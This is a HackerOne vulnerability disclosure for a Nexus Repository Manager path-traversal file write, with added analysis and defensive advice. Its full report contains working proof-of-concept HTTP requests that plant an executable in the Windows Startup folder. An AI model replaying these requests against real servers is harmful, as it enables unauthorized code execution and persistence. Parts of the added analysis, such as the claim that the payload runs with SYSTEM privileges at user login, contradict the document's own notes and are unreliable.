# Unrestricted File Upload Leading to Remote Code Execution in Nexus Repository Manager

## Metadata
- **Source:** HackerOne
- **Report:** 683965 | https://hackerone.com/reports/683965
- **Submitted:** 2019-08-28
- **Reporter:** hland
- **Program:** Sonatype Nexus Repository Manager
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Unrestricted File Upload, Path Traversal, Arbitrary File Write, Remote Code Execution, Privilege Escalation
- **CVEs:** CVE-2019-15893
- **Category:** memory-binary

## Summary
Nexus Repository Manager OSS 2.14.9-01 allows authenticated administrators to upload arbitrary files to any location on the Windows file system through repository configuration manipulation and file upload parameters. By combining path traversal through the 'overrideLocalStorageUrl' parameter with malicious artifact uploads, attackers can write executables to sensitive locations like the Windows Startup folder, achieving code execution with SYSTEM privileges when the user logs in.

## Attack scenario
1. Attacker gains administrator access to Nexus Repository Manager (through credential compromise or insider threat)
2. Attacker creates a custom repository with 'overrideLocalStorageUrl' pointing to Windows Startup directory (two levels up from target)
3. Attacker crafts multipart POST request to '/nexus/service/local/artifact/maven/content' with malicious executable file
4. Attacker manipulates 'g' (groupId), 'a' (artifactId), and 'v' (version) parameters to control file path traversal
5. Malicious PE executable (e.g., calc.exe) is written to Windows Startup folder with SYSTEM privileges
6. Next user login triggers execution of malicious payload with elevated privileges, allowing lateral movement or system compromise

## Root cause
Inadequate input validation and path traversal protection in file upload handler. The application does not properly sanitize the 'overrideLocalStorageUrl' parameter or validate that file uploads remain within intended repository boundaries. No checks prevent writing to arbitrary filesystem locations outside the repository storage directory.

## Attacker mindset
An insider or attacker with admin credentials seeks persistent system compromise. Rather than direct RCE, they exploit the gap between Nexus service privileges (SYSTEM) and user login context to establish persistence that survives process restarts. This demonstrates lateral movement thinking—using repository manager as a pivot point to compromise the underlying Windows system.

## Defensive takeaways
- Implement strict path canonicalization and whitelist allowed storage directories; reject any paths containing '..' or absolute paths outside repository base
- Validate 'overrideLocalStorageUrl' against a whitelist of safe directories and prevent directory traversal sequences
- Run Nexus service with least privilege (not SYSTEM); use dedicated service account with minimal permissions
- Implement file type validation beyond extension checking; use magic number/signature verification for uploads
- Add comprehensive audit logging for repository creation, configuration changes, and file uploads with source IP tracking
- Restrict administrator functionality; require approval workflows or multi-factor authentication for sensitive configuration changes
- Use file system permissions to prevent write access to critical OS directories from the Nexus service account
- Monitor for suspicious repository configurations targeting system directories in logs

## Variant hunting
Search for similar issues in: (1) other artifact repository managers (Artifactory, Archiva) with custom storage URL parameters, (2) Java applications using file:// protocol URIs without proper validation, (3) Maven/Gradle plugins that support custom repository paths, (4) Any service that combines user-controlled paths with high-privilege execution context, (5) Windows services running as SYSTEM with file write capabilities to user startup folders

## MITRE ATT&CK
- T1190
- T1190
- T1547.001
- T1547.005
- T1548.002
- T1105
- T1083
- T1574.008

## Notes
Affects Nexus Repository Manager OSS 2.14.9-01 on Windows Server 2016. The vulnerability requires prior authentication but no special privileges beyond standard admin role. The two-level directory traversal requirement suggests incomplete path validation logic. Patch status incomplete in writeup. This is a classic example of how privilege inheritance (Nexus running as SYSTEM) combined with insufficient input validation creates critical system compromise. The use of Windows Startup folder is particularly effective for persistence and execution with user context.

## Full report
<details><summary>Expand</summary>

### Description
As an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.

In the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe. 

The tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.

### Additional Details
Unfortunately I was unable to dig up the functions handling these HTTP requests.

## Steps to reproduce:
1. Create a repo and set the "overrideLocalStorageUrl" to a folder two levels below the one you want to write files to.

`POST /nexus/service/local/repositories`

2. Upload a file to a directory of your choice by manipulating the "g", "a" and "v" parameters

`POST /nexus/service/local/artifact/maven/content`


### Proof-Of-Concept

1. Create repository:

```
POST /nexus/service/local/repositories HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
X-Nexus-UI: true
Content-Length: 443
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}

HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 16:58:53 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: application/json; charset=UTF-8
Content-Length: 638
Connection: close

{"data":{"contentResourceURI":"http://<redacted>/nexus/content/repositories/5000","id":"5000","name":"MyTestRepo","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","format":"maven2","repoType":"hosted","exposed":true,"writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","downloadRemoteIndexes":false,"overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","defaultLocalStorageUrl":"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000"}}
```

2. Upload file

```
POST /nexus/service/local/artifact/maven/content HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269
Content-Length: 33250
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770
Upgrade-Insecure-Requests: 1

-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="r"

5000
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="g"

Programs
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="a"

Startup
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="v"

.
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="p"

jar
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="c"


-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="e"

exe
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="file"; filename="calc.exe"
Content-Type: text/html

<insert_content_of_calc.exe>
-----------------------------103850373015325909411337083269--


HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 17:05:47 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: text/html;charset=UTF-8
Content-Length: 77
Connection: close

{"groupId":"Programs","artifactId":"Startup","version":".","packaging":"jar"}
```

## Patch
There are multiple ways to fix this:

1. Make it the default to run Nexus Repository Manager as a less privileged user. 
2. Restrict the locations on the filesystem that Nexus Repository Manager can write to.

## Additional details

* OS Name:                   Microsoft Windows Server 2016 Datacenter
* OS Version:                10.0.14393 N/A Build 14393

* java version "1.8.0_211"
Java(TM) SE Runtime Environment (build 1.8.0_211-b12)
Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

My reaction when uploading files to any location on the filesystem:
https://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif

## Impact

The attacker could run arbitrary code on the server as the SYSTEM user.

</details>

---
*Analysed by Claude on 2026-05-24*
